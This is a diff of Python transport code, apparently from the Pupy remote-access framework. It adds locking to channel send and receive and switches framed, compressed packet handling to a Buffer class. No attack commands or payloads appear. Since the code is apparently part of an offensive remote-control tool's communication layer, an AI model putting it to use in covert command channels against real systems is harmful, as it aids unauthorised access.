@@ -27,6 +27,9 @@ import traceback
 import zlib
 
 from rpyc.lib.compat import select, select_error, get_exc_errno, maxint
+
+from network.lib.buffer import Buffer
+
 import threading
 
 class addGetPeer(object):
@@ -43,6 +46,7 @@ class PupyChannel(Channel):
         self.compress = True
         self.COMPRESSION_LEVEL = 5
         self.COMPRESSION_THRESHOLD = self.stream.MAX_IO_CHUNK
+        self._channel_lock = threading.RLock()
 
     def consume(self):
         return self.stream.consume()
@@ -51,7 +55,19 @@ class PupyChannel(Channel):
         return self.stream.wake()
 
     def recv(self):
+        # print "RECV", threading.currentThread()
+        with self._channel_lock:
+            return self._recv()
+
+    def send(self, data):
+        # print "SEND", threading.currentThread()
+        with self._channel_lock:
+            self._send(data)
+
+    def _recv(self):
         """ Recv logic with interruptions """
+
+        # print "RECV! WAIT FOR LENGTH!"
 
         packet = self.stream.read(self.FRAME_HEADER.size)
         # If no packet - then just return
@@ -67,8 +83,10 @@ class PupyChannel(Channel):
                 del packet
 
         length, compressed = self.FRAME_HEADER.unpack(header)
+        # print "RECV! WAIT FOR LENGTH COMPLETE!"
 
         required_length = length + len(self.FLUSHER)
+        # print "WAIT FOR", required_length
 
         data = []
         decompressor = None
@@ -76,10 +94,13 @@ class PupyChannel(Channel):
         if compressed:
             decompressor = zlib.decompressobj()
 
+        buf = Buffer()
+
         while required_length:
             packet = self.stream.read(min(required_length, self.COMPRESSION_THRESHOLD))
             if packet:
                 required_length -= len(packet)
+                # print "GET", len(packet)
                 if not required_length:
                     packet = packet[:-len(self.FLUSHER)]
 
@@ -89,19 +110,17 @@ class PupyChannel(Channel):
                         continue
 
                 if packet:
-                    data.append(packet)
+                    buf.write(packet)
 
         if compressed:
             packet = decompressor.flush()
             if packet:
-                data.append(packet)
+                buf.write(packet)
 
-        result = ''.join(data)
-        del data[:]
+        # print "COMPLETE!"
+        return buf
 
-        return result
-
-    def send(self, data):
+    def _send(self, data):
         """ Smarter compression support """
         compressed = 0
 
@@ -112,7 +131,7 @@ class PupyChannel(Channel):
         # print "SEND .. ", ldata, data[:64].encode('hex')
 
         if self.compress and ldata > self.COMPRESSION_THRESHOLD:
-            portion = data[:self.COMPRESSION_THRESHOLD]
+            portion = data.peek(self.COMPRESSION_THRESHOLD)
             portion = zlib.compress(portion)
             lportion = len(portion)
             if lportion < self.COMPRESSION_THRESHOLD:
@@ -134,7 +153,7 @@ class PupyChannel(Channel):
         i = 0
 
         while rest > 0:
-            cdata = data[i:i+self.COMPRESSION_THRESHOLD]
+            cdata = data.read(self.COMPRESSION_THRESHOLD)
 
             lcdata = len(cdata)
             rest -= lcdata
@@ -178,7 +197,6 @@ class PupySocketStream(SocketStream):
             peername = sock.getpeername()
 
         self.downstream = Buffer(
-            preallocate=self.MAX_IO_CHUNK,
             on_write=self._upstream_recv,
             transport_func=addGetPeer(peername))
 
@@ -188,8 +206,8 @@ class PupySocketStream(SocketStream):
         self.transport = transport_class(self, **transport_kwargs)
 
         #buffers for streams
-        self.buf_in=Buffer(preallocate=self.MAX_IO_CHUNK)
-        self.buf_out=Buffer(preallocate=self.MAX_IO_CHUNK)
+        self.buf_in=Buffer()
+        self.buf_out=Buffer()
 
         self.on_connect()
 
@@ -251,6 +269,7 @@ class PupySocketStream(SocketStream):
     def _upstream_recv(self):
         """ called as a callback on the downstream.write """
         if len(self.downstream)>0:
+            # print "SEND TO CHANNEL", len(self.downstream)
             self.downstream.write_to(super(PupySocketStream, self))
 
     def waitfor(self, count):
